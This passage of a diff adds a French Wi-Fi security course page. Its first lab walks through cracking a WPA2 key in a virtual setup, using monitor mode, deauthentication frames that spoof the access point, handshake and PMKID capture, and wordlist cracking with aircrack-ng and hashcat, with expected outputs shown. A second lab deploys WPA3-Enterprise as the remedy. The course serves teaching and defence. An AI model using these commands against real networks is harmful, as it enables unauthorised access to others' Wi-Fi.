+                                        <div class="step-warn"><i class="fas fa-exclamation-triangle me-1"></i> Cette commande coupe aussi wpa_supplicant sur wlan1. Retournez dans le Terminal 2 et relancez la connexion client si nécessaire : <code>sudo systemctl stop NetworkManager wpa_supplicant; sudo pkill -9 wpa_supplicant; sleep 1; sudo rm -rf /run/wpa_supplicant/wlan1</code> puis relancez : <code>sudo wpa_supplicant -i wlan1 -c /opt/swfe837/configs/wpa_supplicant-wpa2-tp1.conf</div>
+                                    </div>
+                                </li>
+
+                                <li class="step-item">
+                                    <div class="step-num">B2</div>
+                                    <div class="step-body">
+                                        <h6>Activer le mode monitor sur wlan2</h6>
+                                        <p><code>wlan2</code> est l'interface attaquant. On crée <code>wlan2mon</code> en mode écoute passive sans toucher à <code>wlan0</code> (AP) ni <code>wlan1</code> (client).</p>
+                                        <pre>sudo airmon-ng start wlan2</pre>
+                                        <div class="step-output"><span class="step-output-label">Sortie attendue</span>PHY     Interface   Driver
+phy2    wlan2       mac80211_hwsim
+
+                (mac80211 monitor mode vif enabled on phy2 → wlan2mon)</div>
+                                        <p>Vérification :</p>
+                                        <pre>iwconfig wlan2mon</pre>
+                                        <div class="step-output"><span class="step-output-label">Sortie attendue</span>wlan2mon  IEEE 802.11  Mode:Monitor  Frequency:2.412 GHz</div>
+                                        <div class="step-info"><i class="fas fa-info-circle me-1"></i> Confirmez que <code>wlan0</code> et <code>wlan1</code> sont toujours actifs : <code>iw dev</code> doit toujours lister les 4 interfaces.</div>
+                                    </div>
+                                </li>
+
+                                <li class="step-item">
+                                    <div class="step-num">B3</div>
+                                    <div class="step-body">
+                                        <h6>Scanner les réseaux Wi-Fi à portée</h6>
+                                        <p>Airodump-ng balaie tous les canaux et liste les AP visibles avec leurs clients associés. Laissez tourner 20–30 secondes, puis <kbd>Ctrl+C</kbd>.</p>
+                                        <pre>sudo airodump-ng wlan2mon</pre>
+                                        <div class="step-output"><span class="step-output-label">Sortie attendue (extrait)</span> BSSID              PWR  Beacons  #Data  CH  MB   ENC   CIPHER  AUTH  ESSID
+ 02:00:00:00:00:00  -30       87      12   6  54e  WPA2  CCMP    PSK   NexelliaWifi
+
+ BSSID              STATION            PWR  Lost  Frames  Probe
+ 02:00:00:00:00:00  02:00:00:00:01:00  -30     0      14</div>
+                                        <p><strong>Notez</strong> le <strong>BSSID de l'AP</strong> (wlan0, ex. <code>02:00:00:00:00:00</code>) et la <strong>MAC du client</strong> (wlan1, ex. <code>02:00:00:00:01:00</code>) — vous en aurez besoin aux étapes suivantes. Ces MACs doivent correspondre à ce que vous avez noté à l'étape A3.</p>
+                                    </div>
+                                </li>
+
+                                <li class="step-item">
+                                    <div class="step-num">B4</div>
+                                    <div class="step-body">
+                                        <h6>Lancer une capture ciblée</h6>
+                                        <p>On fixe <code>wlan2mon</code> sur le canal 6 de l'AP Nexellia et on enregistre tout dans un fichier. Remplacez le BSSID par celui noté à l'étape B3.</p>
+                                        <pre>sudo airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w /tmp/capture wlan2mon</pre>
+                                        <div class="step-output"><span class="step-output-label">Sortie attendue — laisser tourner en arrière-plan</span> CH  6 ][ Elapsed: 12 s ][
+
+ BSSID              PWR  RXQ  Beacons  #Data  CH  MB   ENC   ESSID
+ 02:00:00:00:00:00  -30  100       87      12   6  54e  WPA2  NexelliaWifi
+
+ BSSID              STATION            PWR  Lost  Frames
+ 02:00:00:00:00:00  02:00:00:00:01:00  -30     0      14</div>
+                                        <div class="step-info"><i class="fas fa-info-circle me-1"></i> <strong>Laissez cette fenêtre ouverte.</strong> Le handshake apparaîtra en haut à droite : <code>[ WPA handshake: 02:00:00:00:00:00 ]</code>. Passez à B5 dans un quatrième terminal.</div>
+                                    </div>
+                                </li>
+
+                                <li class="step-item">
+                                    <div class="step-num">B5</div>
+                                    <div class="step-body">
+                                        <h6>Forcer la désauthentification du client</h6>
+                                        <p>Dans un quatrième terminal, envoyez 5 trames de désauthentification en usurpant l'adresse MAC de l'AP. Le client wlan1 est coupé et se reconnecte immédiatement, générant un nouveau handshake capturé par airodump-ng.</p>
+                                        <pre>sudo aireplay-ng -0 5 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2mon</pre>
+                                        <div class="step-output"><span class="step-output-label">Sortie attendue</span>Waiting for beacon frame (BSSID: 02:00:00:00:00:00) on channel 6
+Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:01:00]
+Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:01:00]
+...</div>
+                                        <p>Revenez dans le terminal airodump-ng (B4) : la mention <code>[WPA handshake: 02:00:00:00:00:00]</code> doit apparaître en haut à droite. <strong>C'est le signal que la capture est réussie.</strong> Faites <kbd>Ctrl+C</kbd> pour arrêter airodump-ng.</p>
+                                        <div class="step-warn"><i class="fas fa-exclamation-triangle me-1"></i> Si le handshake n'apparaît pas : vérifiez dans le Terminal 2 que wlan1 est toujours connecté (<code>iw dev wlan1 link</code>). Si wpa_supplicant a été tué à l'étape B1, relancez-le d'abord.</div>
+                                    </div>
+                                </li>
+
+                                <li class="step-item">
+                                    <div class="step-num">B6</div>
+                                    <div class="step-body">
+                                        <h6>Vérifier le fichier de capture</h6>
+                                        <p>Airodump-ng a créé plusieurs fichiers. Vérifiez que le handshake est bien présent avec <code>aircrack-ng</code> avant de lancer le crack :</p>
+                                        <pre>ls /tmp/capture*
+aircrack-ng /tmp/capture-01.cap</pre>
+                                        <div class="step-output"><span class="step-output-label">Sortie attendue</span>Opening /tmp/capture-01.cap
+Read 842 packets.
+
+   #  BSSID              ESSID          Encryption
+
+   1  AA:BB:CC:DD:EE:FF  NexelliaWifi   WPA (1 handshake)</div>
+                                        <div class="step-info"><i class="fas fa-info-circle me-1"></i> La mention <strong>"(1 handshake)"</strong> confirme que la capture est exploitable. Si vous voyez "(0 handshake)", retournez à l'étape B5.</div>
+                                    </div>
+                                </li>
+
+                                <li class="step-item">
+                                    <div class="step-num">B7</div>
+                                    <div class="step-body">
+                                        <h6>Cracker la clé avec aircrack-ng</h6>
+                                        <p>Aircrack-ng est un crack CPU pur — pas d'OpenCL, pas de GPU, pas de problème mémoire. Il travaille directement sur le fichier <code>.cap</code> capturé. C'est l'outil idéal en environnement VM.</p>
+                                        <pre>aircrack-ng -w /opt/wordlists/rockyou_small.txt /tmp/capture-01.cap</pre>
+                                        <div class="step-output"><span class="step-output-label">Sortie attendue</span>                               Aircrack-ng 1.7
+
+      [00:00:01] 100000/100000 keys tested (xxxxx k/s)
+
+      Time left: 0 seconds                                     100.00%
+
+                        KEY FOUND! [ labo2026 ]
+
+
+      Master Key     : XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX
+      Transient Key  : XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX
+      EAPOL HMAC     : XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX</div>
+                                        <p>La clé est affichée entre crochets : <strong>KEY FOUND! [ labo2026 ]</strong></p>
+                                        <div class="step-info"><i class="fas fa-info-circle me-1"></i> <strong>Variante hashcat (GPU requis) :</strong> sur une machine physique avec GPU, la conversion + crack hashcat est 10 à 100x plus rapide. En VM, aircrack-ng est plus fiable.</div>
+                                    </div>
+                                </li>
+
+                                <li class="step-item">
+                                    <div class="step-num">B8</div>
+                                    <div class="step-body">
+                                        <h6>Variante PMKID — optionnel, bonus</h6>
+                                        <p>Si aucun client n'est associé à l'AP, le PMKID peut être capturé directement depuis les trames de l'AP — sans désauthentification. <strong>Cette étape est un bonus</strong> : vous avez déjà la clé via aircrack-ng.</p>
+                                        <div class="step-info"><i class="fas fa-info-circle me-1"></i> La syntaxe hcxdumptool a changé en version 7.x. Vérifiez les options disponibles sur votre installation avant de lancer : <code>hcxdumptool -h | head -30</code></div>
+                                        <pre># Vérifier la syntaxe de votre version
+hcxdumptool -h | grep -E "write|output|interface"
+
+# Syntaxe hcxdumptool ≥ 7.x (--write à la place de -o)
+sudo hcxdumptool -i wlan2mon --write=/tmp/pmkid.pcapng --enable_status=1
+
+# Convertir le pcapng en hash
+hcxpcapngtool -o /tmp/pmkid.hc22000 /tmp/pmkid.pcapng
+
+# Cracker avec aircrack-ng si le hash contient une paire EAPOL
+# (aircrack-ng ne supporte pas le PMKID pur — nécessite hashcat sur machine physique)
+hashcat -m 22000 /tmp/pmkid.hc22000 /opt/wordlists/rockyou_small.txt --force</pre>
+                                    </div>
+                                </li>
+
+                            </ul><!-- fin step-list -->
+
+                            <!-- ── Checkpoint ── -->
+                            <div class="checkpoint-box">
+                                <h6><i class="fas fa-check-circle me-2"></i>Critères de validation</h6>
+                                <ul>
+                                    <li>Partie A : hostapd affiche <code>AP-ENABLED</code> et <code>AP-STA-CONNECTED</code></li>
+                                    <li>Partie A : <code>iw dev wlan1 link</code> affiche <code>Connected to ... SSID: NexelliaWifi</code></li>
+                                    <li>Partie B : interface <code>wlan2mon</code> en mode monitor confirmée</li>
+                                    <li>Partie B : fichier <code>capture-01.cap</code> contient "(1 handshake)"</li>
+                                    <li>Partie B : hashcat affiche <strong>Status: Cracked</strong> et la clé en clair</li>
+                                    <li>Capture d'écran de chaque étape clé prise pour le portfolio</li>
+                                </ul>
+                            </div>
+
+                            <!-- ── Dépannage ── -->
+                            <div class="troubleshoot-box">
+                                <h6><i class="fas fa-wrench me-2"></i>Dépannage</h6>
+                                <div class="tr-item">
+                                    <div class="tr-prob">⚠ "ctrl_iface exists and seems to be in use"</div>
+                                    <div class="tr-sol">NetworkManager ou systemd relance wpa_supplicant immédiatement après le pkill, recréant le socket avant votre rm. Solution : arrêter les services système d'abord :
+                                        <code>sudo systemctl stop NetworkManager wpa_supplicant; sudo pkill -9 wpa_supplicant; sleep 1; sudo rm -rf /run/wpa_supplicant/wlan1</code>
+                                        puis relancez wpa_supplicant manuellement.
+                                    </div>
+                                </div>
+                                <div class="tr-item">
+                                    <div class="tr-prob">⚠ Messages "nl80211: kernel reports: Match already configured"</div>
+                                    <div class="tr-sol">Avertissements inoffensifs liés aux filtres multicast nl80211. Ils n'empêchent pas la connexion. Ignorez-les — regardez uniquement la ligne <code>CTRL-EVENT-CONNECTED</code> pour confirmer le succès.</div>
+                                </div>
+                                <div class="tr-item">
+                                    <div class="tr-prob">⚠ "dhclient: command not found"</div>
+                                    <div class="tr-sol">Kali utilise <code>dhcpcd</code> plutôt que <code>dhclient</code>. Remplacez par : <code>sudo dhcpcd wlan1</code>. Si dhcpcd est aussi absent, assignez l'IP manuellement : <code>sudo ip addr add 192.168.42.10/24 dev wlan1</code></div>
+                                </div>
+                                <div class="tr-item">
+                                    <div class="tr-prob">⚠ "device or resource busy" / airmon-ng échoue</div>
+                                    <div class="tr-sol">NetworkManager n'a pas été tué. Relancez : <code>sudo airmon-ng check kill</code> puis <code>sudo airmon-ng start wlan0</code>.</div>
+                                </div>
+                                <div class="tr-item">
+                                    <div class="tr-prob">⚠ Aucune interface Wi-Fi listée par <code>iw dev</code></div>
+                                    <div class="tr-sol">En VM, l'adaptateur USB n'est pas passé dans VirtualBox. Vérifiez Configuration → USB. Alternative : <code>sudo modprobe mac80211_hwsim radios=4</code> pour des interfaces virtuelles.</div>
+                                </div>
+                                <div class="tr-item">
+                                    <div class="tr-prob">⚠ Handshake absent après plusieurs désauth</div>
+                                    <div class="tr-sol">Le client n'est pas ou plus associé à l'AP. Vérifiez dans la VM Client qu'elle est connectée à NexelliaWifi, puis relancez la désauth. Essayez aussi la méthode PMKID (étape 9) qui ne nécessite pas de client.</div>
+                                </div>
+                                <div class="tr-item">
+                                    <div class="tr-prob">⚠ Hashcat : erreurs mémoire ou OpenCL en VM</div>
+                                    <div class="tr-sol">En environnement VM, hashcat manque souvent de mémoire allouable pour les kernels WPA2. Solution : utiliser <code>aircrack-ng</code> directement (étape B7) — aucune dépendance OpenCL, fonctionne sur tout CPU.</div>
+                                </div>
+                                <div class="tr-item">
+                                    <div class="tr-prob">⚠ Hashcat : "No hashes loaded"</div>
+                                    <div class="tr-sol">Le fichier <code>.hc22000</code> est vide ou corrompu. Relancez <code>hcxpcapngtool</code> et vérifiez qu'il signale au moins "EAPOL pairs: 1" ou "PMKID: 1".</div>
+                                </div>
+                                <div class="tr-item">
+                                    <div class="tr-prob">⚠ Hashcat : Status "Exhausted" sans résultat</div>
+                                    <div class="tr-sol">Le mot de passe n'est pas dans <code>rockyou_small.txt</code>. Vérifiez le mot de passe configuré sur la VM AP et ajoutez-le manuellement à la wordlist : <code>echo "votre_mdp" >> /opt/wordlists/rockyou_small.txt</code></div>
+                                </div>
+                            </div>
+
+                            <!-- ── Questions ── -->
+                            <div class="analysis-box">
+                                <h6><i class="fas fa-question-circle"></i> Questions d'analyse</h6>
+                                <ol>
+                                    <li>Qu'est-ce qu'un PMKID et pourquoi sa capture rend l'attaque plus rapide qu'un handshake classique ?</li>
+                                    <li>Comment le 802.11w (PMF) aurait-il empêché la désauthentification à l'étape 5 ?</li>
+                                    <li>Donnez 3 caractéristiques d'un mot de passe Wi-Fi résistant à ce type d'attaque.</li>
+                                    <li>Si l'AP Nexellia passe à WPA3-SAE, cette attaque fonctionnerait-elle encore ? Justifiez structurellement.</li>
+                                </ol>
+                            </div>
+
+                            <!-- ── Livrables ── -->
+                            <div class="deliverable-box">
+                                <h6><i class="fas fa-box-archive me-1"></i> Livrables pour le portfolio</h6>
+                                <ul>
+                                    <li>Capture d'écran d'<code>airodump-ng</code> affichant <code>[WPA handshake: ...]</code></li>
+                                    <li>Capture d'écran de <code>hashcat</code> avec <code>Status: Cracked</code> et la clé visible</li>
+                                    <li>Analyse écrite ≥ 300 mots : exposition réelle de Nexellia, délai de crack estimé avec différents mots de passe, recommandations immédiates</li>
+                                </ul>
+                            </div>
+
+                        </div>
+                    </div>
+                </div>
+
+                <!-- ══ TP2 ══ -->
+                <div class="accordion-item">
+                    <h2 class="accordion-header" id="heading2">
+                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse2" aria-expanded="false" aria-controls="collapse2">
+                            <i class="fas fa-lock me-2"></i> TP2 – WPA3-Enterprise avec RADIUS (2h30)
+                        </button>
+                    </h2>
+                    <div id="collapse2" class="accordion-collapse collapse" aria-labelledby="heading2" data-bs-parent="#mainAccordion">
+                        <div class="accordion-body">
+
+                            <div class="mission-card">
+                                <div class="mission-label"><i class="fas fa-shield-halved me-1"></i> Mission 2 · Remédier à la vulnérabilité</div>
+                                <p>La DSI de Nexellia est convaincue. Vous êtes chargés de concevoir la nouvelle architecture Wi-Fi. L'objectif : <strong>rendre impossible le crack de clé</strong> et résister aux attaques Evil Twin. Vous déployez WPA3-Enterprise avec EAP-TLS — chaque collaborateur s'authentifie avec son certificat personnel signé par la CA interne.</p>
+                            </div>
+
+                            <h5>Objectifs</h5>
+                            <ul>
+                                <li>Comprendre l'architecture 802.1X / EAP-TLS et le rôle de chaque composant</li>
+                                <li>Démarrer FreeRADIUS et valider son fonctionnement avec <code>radtest</code></li>
+                                <li>Configurer l'AP WPA3-Enterprise avec <code>hostapd</code></li>
+                                <li>Connecter un client via son certificat personnel avec <code>wpa_supplicant</code></li>
+                                <li>Démontrer l'échec d'un Evil Twin face à la vérification du certificat serveur</li>
+                                <li>Mesurer l'impact de l'absence de <code>ca_cert</code> côté client</li>
+                            </ul>
+
+                            <!-- ── Théorie ── -->
+                            <div class="section-sub">Rappel théorique</div>
+                            <div class="theory-box">
+                                <h6><i class="fas fa-book-open me-2"></i>Comment fonctionne WPA3-Enterprise / EAP-TLS ?</h6>
+                                <p>Contrairement à WPA2-PSK, il n'y a <strong>pas de secret partagé</strong>. L'authentification repose sur une <strong>infrastructure PKI</strong> : une autorité de certification (CA) signe les certificats du serveur RADIUS et de chaque client. L'échange se déroule en 3 phases :</p>
+                                <ul>
+                                    <li><strong>Phase 1 — Association 802.11 :</strong> le client s'associe à l'AP sans s'authentifier encore.</li>
+                                    <li><strong>Phase 2 — Tunnel TLS (EAP) :</strong> le client et le serveur RADIUS établissent un tunnel TLS mutuellement authentifié. Le client <em>vérifie le certificat du serveur</em> (protection contre l'Evil Twin). Le serveur <em>vérifie le certificat du client</em> (authentification individuelle).</li>
+                                    <li><strong>Phase 3 — Dérivation des clés :</strong> si les deux certificats sont valides, le RADIUS envoie un Access-Accept à l'AP, qui enclenche le 4-way handshake pour dériver les clés de session.</li>
+                                </ul>
+                                <p>La clé de la sécurité : le client doit configurer <code>ca_cert</code> pour vérifier l'identité du serveur RADIUS. Sans cela, il accepte n'importe quel serveur — y compris celui d'un Rogue AP.</p>
+                            </div>
+
+                            <div class="concept-grid">
+                                <div class="concept-card">
+                                    <div class="ct">PKI / CA</div>
+                                    <p>Infrastructure à clé publique. La CA (Certificate Authority) signe les certificats du serveur RADIUS et des clients. La chaîne de confiance repose sur ce certificat racine.</p>
+                                </div>
+                                <div class="concept-card">
+                                    <div class="ct">FreeRADIUS</div>
+                                    <p>Serveur RADIUS open-source. Gère l'authentification 802.1X, vérifie le certificat client, et envoie un Access-Accept ou Access-Reject à l'AP.</p>
+                                </div>
+                                <div class="concept-card">
+                                    <div class="ct">hostapd (AP)</div>
+                                    <p>Point d'accès logiciel. En mode Enterprise, il ne fait que relayer les échanges EAP entre le client et le serveur RADIUS. Il ne connaît pas les certificats.</p>
+                                </div>
+                                <div class="concept-card">
+                                    <div class="ct">wpa_supplicant</div>
+                                    <p>Client Wi-Fi côté Linux. C'est lui qui effectue la vérification du certificat serveur (<code>ca_cert</code>) et présente le certificat client lors de l'échange TLS.</p>
+                                </div>
+                            </div>
+
+                            <!-- ── Prérequis ── -->
+                            <div class="section-sub">Prérequis</div>
+                            <div class="prereq-box">
+                                <h6><i class="fas fa-list-check me-2"></i>Avant de commencer</h6>
+                                <ul>
+                                    <li>TP1 terminé — snapshot <em>"Après_TP1"</em> créé, <code>reset_labo.sh</code> exécuté</li>
+                                    <li>Interfaces wlan0, wlan1, wlan2 disponibles : <code>iw dev</code></li>
+                                    <li>Certificats générés par <code>install_labo.sh</code> : <code>ls /opt/swfe837/certs/</code> doit lister <code>ca.pem</code>, <code>server.pem</code>, <code>server.key</code>, <code>client.pem</code>, <code>client.key</code></li>
+                                    <li>FreeRADIUS installé : <code>which freeradius</code></li>
+                                </ul>
+                            </div>
+
+                            <!-- ── Affectation des interfaces ── -->
+                            <div class="section-sub">Affectation des interfaces pour ce TP</div>
+                            <div class="theory-box">
+                                <h6><i class="fas fa-network-wired me-2"></i>Rôle de chaque interface</h6>
+                                <ul>
+                                    <li><strong>wlan0</strong> → <span style="color:#b37700">AP WPA3-Enterprise (hostapd)</span></li>
+                                    <li><strong>wlan1</strong> → <span style="color:#0d47a1">Client légitime (wpa_supplicant + certificat)</span></li>
+                                    <li><strong>wlan2</strong> → <span style="color:#c62828">Rogue AP Evil Twin (hostapd open) — démonstration finale</span></li>
+                                    <li><strong>FreeRADIUS</strong> → tourne en local (<code>127.0.0.1:1812</code>), pas d'interface Wi-Fi</li>
+                                </ul>
+                            </div>
+
+                            <!-- ── Schéma ── -->
+                            <div class="section-sub">Architecture EAP-TLS</div>
+                            <div class="diagram">
+                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 350" width="800" height="350">
+                                    <defs>
+                                        <filter id="shadow2"><feDropShadow dx="2" dy="2" stdDeviation="2" flood-opacity="0.15"/></filter>
+                                        <marker id="arrowBlue2" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 Z" fill="#1a3e72"/></marker>
+                                        <marker id="arrowGreen2" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 Z" fill="#2e7d32"/></marker>
+                                        <marker id="arrowRed2" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 Z" fill="#cc0000"/></marker>
+                                    </defs>
+                                    <rect width="800" height="350" fill="#fff" rx="10"/>
+                                    <text x="400" y="28" text-anchor="middle" font-family="Arial" font-size="15" font-weight="bold" fill="#1e3c72">TP2 – WPA3-Enterprise / EAP-TLS</text>
+                                    <!-- Zone légitime -->
+                                    <rect x="20" y="50" width="530" height="260" fill="#e8f5e9" stroke="#2e7d32" stroke-dasharray="8,4" rx="10"/>
+                                    <text x="285" y="73" text-anchor="middle" font-family="Arial" font-size="12" font-weight="bold" fill="#2e7d32">Infrastructure légitime</text>
+                                    <!-- Client -->
+                                    <rect x="40" y="95" width="120" height="65" fill="#e3f2fd" stroke="#1a3e72" stroke-width="2" rx="6" filter="url(#shadow2)"/>
+                                    <text x="100" y="118" text-anchor="middle" font-family="Arial" font-size="11" font-weight="bold" fill="#0d47a1">Client</text>
+                                    <text x="100" y="134" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">wlan1</text>
+                                    <text x="100" y="148" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">cert client.pem</text>
+                                    <!-- AP -->
+                                    <rect x="225" y="95" width="130" height="65" fill="#fff8e0" stroke="#cc9900" stroke-width="2" rx="6" filter="url(#shadow2)"/>
+                                    <text x="290" y="118" text-anchor="middle" font-family="Arial" font-size="11" font-weight="bold" fill="#b37700">AP WPA3-Ent.</text>
+                                    <text x="290" y="134" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">wlan0 / hostapd</text>
+                                    <text x="290" y="148" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">EAP relay → RADIUS</text>
+                                    <!-- RADIUS -->
+                                    <rect x="415" y="95" width="115" height="65" fill="#e3f2fd" stroke="#1a3e72" stroke-width="2" rx="6" filter="url(#shadow2)"/>
+                                    <text x="473" y="118" text-anchor="middle" font-family="Arial" font-size="11" font-weight="bold" fill="#0d47a1">FreeRADIUS</text>
+                                    <text x="473" y="134" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">127.0.0.1:1812</text>
+                                    <text x="473" y="148" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">server.pem / ca.pem</text>
+                                    <!-- Flèches auth -->
+                                    <line x1="160" y1="127" x2="225" y2="127" stroke="#1a3e72" stroke-width="2" marker-end="url(#arrowBlue2)"/>
+                                    <text x="193" y="121" text-anchor="middle" font-family="Arial" font-size="9" fill="#1a3e72">① Assoc.</text>
+                                    <line x1="355" y1="127" x2="415" y2="127" stroke="#1a3e72" stroke-width="2" marker-end="url(#arrowBlue2)"/>
+                                    <text x="385" y="121" text-anchor="middle" font-family="Arial" font-size="9" fill="#1a3e72">② EAP relay</text>
+                                    <line x1="415" y1="147" x2="355" y2="147" stroke="#2e7d32" stroke-width="2" marker-end="url(#arrowGreen2)"/>
+                                    <text x="385" y="162" text-anchor="middle" font-family="Arial" font-size="9" fill="#2e7d32">③ Access-Accept</text>
+                                    <!-- Succès -->
+                                    <rect x="200" y="235" width="165" height="40" fill="#c8e6c9" stroke="#2e7d32" stroke-width="2" rx="20"/>
+                                    <text x="283" y="259" text-anchor="middle" font-family="Arial" font-size="11" font-weight="bold" fill="#1b5e20">✓ Connecté</text>
+                                    <line x1="290" y1="160" x2="283" y2="235" stroke="#2e7d32" stroke-width="2" marker-end="url(#arrowGreen2)"/>
+                                    <!-- Zone attaquant -->
+                                    <rect x="570" y="50" width="210" height="260" fill="#ffebee" stroke="#c62828" stroke-dasharray="8,4" rx="10"/>
+                                    <text x="675" y="73" text-anchor="middle" font-family="Arial" font-size="12" font-weight="bold" fill="#c62828">Evil Twin (wlan2)</text>
+                                    <rect x="590" y="95" width="170" height="65" fill="#ffe0e0" stroke="#cc0000" stroke-width="2" rx="6" filter="url(#shadow2)"/>
+                                    <text x="675" y="118" text-anchor="middle" font-family="Arial" font-size="11" font-weight="bold" fill="#b71c1c">Rogue AP</text>
+                                    <text x="675" y="134" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">Même SSID</text>
+                                    <text x="675" y="148" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">Cert. auto-signé (CA inconnue)</text>
+                                    <!-- Rejet -->
+                                    <rect x="610" y="235" width="130" height="40" fill="#ffebee" stroke="#c62828" stroke-width="2" rx="20"/>
+                                    <text x="675" y="259" text-anchor="middle" font-family="Arial" font-size="11" font-weight="bold" fill="#c62828">✗ Rejeté</text>
+                                    <line x1="675" y1="160" x2="675" y2="235" stroke="#cc0000" stroke-width="2" marker-end="url(#arrowRed2)"/>
+                                    <text x="710" y="200" font-family="Arial" font-size="9" fill="#cc0000">CA inconnue</text>
+                                    <text x="400" y="340" text-anchor="middle" font-family="Arial" font-size="10" fill="#666">Le client vérifie ca_cert → le Rogue AP ne peut pas présenter un certificat signé par notre CA.</text>
+                                </svg>
+                            </div>
+
+                            <!-- ── Partie A : FreeRADIUS ── -->
+                            <div class="section-sub">Partie A — Démarrer et valider FreeRADIUS</div>
+                            <p class="small text-muted">Ouvrez <strong>3 terminaux</strong>. FreeRADIUS et hostapd restent ouverts toute la durée du TP.</p>
+
+                            <ul class="step-list">
+
+                                <li class="step-item">
+                                    <div class="step-num">A1</div>
+                                    <div class="step-body">
+                                        <h6>Terminal 1 — Copier les fichiers FreeRADIUS du labo</h6>
+                                        <p>Les fichiers de configuration FreeRADIUS du labo remplacent les fichiers système. La commande copie les trois fichiers aux bons emplacements.</p>
+                                        <pre>sudo cp /opt/swfe837/freeradius/clients.conf  /etc/freeradius/3.0/clients.conf
+sudo cp /opt/swfe837/freeradius/eap.conf      /etc/freeradius/3.0/mods-available/eap
+sudo cp /opt/swfe837/freeradius/users         /etc/freeradius/3.0/users
+sudo chown -R freerad:freerad /etc/freeradius/3.0/</pre>
+                                        <div class="step-info"><i class="fas fa-info-circle me-1"></i> Sur Kali, le répertoire de configuration peut être <code>/etc/freeradius/</code> (sans le sous-dossier <code>3.0</code>). Vérifiez avec <code>ls /etc/freeradius/</code>.</div>
+                                    </div>
+                                </li>
+
+                                <li class="step-item">
+                                    <div class="step-num">A2</div>
+                                    <div class="step-body">
+                                        <h6>Terminal 1 — Démarrer FreeRADIUS en mode debug</h6>
+                                        <p>Le mode <code>-X</code> affiche toutes les transactions en temps réel — indispensable pour diagnostiquer les problèmes d'authentification. Ce terminal doit rester ouvert.</p>
+                                        <pre>sudo freeradius -X</pre>
+                                        <div class="step-output"><span class="step-output-label">Sortie attendue (dernières lignes)</span>...
+FreeRADIUS Version 3.2.x
+...
+Loaded virtual server &lt;default&gt;
+Ready to process requests</div>
+                                        <div class="step-warn"><i class="fas fa-exclamation-triangle me-1"></i> Si FreeRADIUS affiche une erreur sur les certificats (<code>SSL: error</code>), vérifiez que les chemins dans <code>eap.conf</code> pointent bien vers <code>/opt/swfe837/certs/</code>. Relancez <code>install_labo.sh</code> si les certificats sont absents.</div>
+                                    </div>
+                                </li>
+
+                                <li class="step-item">
+                                    <div class="step-num">A3</div>
+                                    <div class="step-body">
+                                        <h6>Terminal 2 — Tester FreeRADIUS sans Wi-Fi</h6>
+                                        <p><code>radtest</code> simule une requête RADIUS depuis un NAS (ici l'AP) vers le serveur. C'est le moyen le plus rapide de valider que FreeRADIUS fonctionne <em>avant</em> d'impliquer hostapd.</p>
+                                        <pre>radtest etudiant1 labo2026 127.0.0.1 0 labo_secret_2026</pre>
+                                        <div class="step-output"><span class="step-output-label">Sortie attendue — succès</span>Sent Access-Request Id 42 from 0.0.0.0:PORT to 127.0.0.1:1812 length 78
+Received Access-Accept Id 42 from 127.0.0.1:1812 to 0.0.0.0 length 26
+	Reply-Message = "Bienvenue, etudiant1 !"</div>
+                                        <p>Dans le terminal FreeRADIUS (A2), vous devez voir :</p>
+                                        <div class="step-output"><span class="step-output-label">Log FreeRADIUS correspondant</span>(0) pap: Login attempt with password
+(0) pap: Login correct</div>
+                                        <div class="step-warn"><i class="fas fa-exclamation-triangle me-1"></i> Si vous obtenez <code>Access-Reject</code> : vérifiez que le compte <code>etudiant1</code> est bien dans <code>/etc/freeradius/3.0/users</code> avec le mot de passe <code>labo2026</code>.</div>
+                                    </div>
+                                </li>
+
+                            </ul>
+
+                            <div class="checkpoint-box">
+                                <h6><i class="fas fa-check-circle me-2"></i>Validation Partie A</h6>
+                                <ul>
+                                    <li>FreeRADIUS affiche <code>Ready to process requests</code></li>
+                                    <li><code>radtest</code> retourne <code>Access-Accept</code></li>
+                                </ul>
+                            </div>
+
+                            <!-- ── Partie B : AP + Client ── -->
+                            <div class="section-sub">Partie B — Démarrer l'AP et connecter le client</div>
+
+                            <ul class="step-list">
+
+                                <li class="step-item">
+                                    <div class="step-num">B1</div>
+                                    <div class="step-body">
+                                        <h6>Terminal 2 — Démarrer l'AP WPA3-Enterprise</h6>
+                                        <pre>sudo hostapd /opt/swfe837/configs/hostapd-wpa3-enterprise.conf</pre>
+                                        <div class="step-output"><span class="step-output-label">Sortie attendue</span>Configuration file: /opt/swfe837/configs/hostapd-wpa3-enterprise.conf
+wlan0: interface state UNINITIALIZED->ENABLED
+wlan0: AP-ENABLED</div>
+                                        <div class="step-info"><i class="fas fa-info-circle me-1"></i> Gardez ce terminal ouvert. Chaque connexion client apparaîtra ici : <code>AP-STA-CONNECTED</code>.</div>
+                                    </div>
+                                </li>
+
+                                <li class="step-item">
+                                    <div class="step-num">B2</div>
+                                    <div class="step-body">
+                                        <h6>Terminal 3 — Connecter le client avec son certificat</h6>
+                                        <p>Le fichier <code>wpa_supplicant-eaptls.conf</code> fourni dans le labo configure wpa_supplicant avec le certificat client et la vérification du certificat serveur via <code>ca_cert</code>. Ouvrez ce fichier et vérifiez sa structure avant de lancer la connexion.</p>
+                                        <pre># Vérifier le contenu du fichier
+cat /opt/swfe837/configs/wpa_supplicant-eaptls.conf
+
+# Libérer l'interface
+sudo systemctl stop NetworkManager wpa_supplicant 2>/dev/null
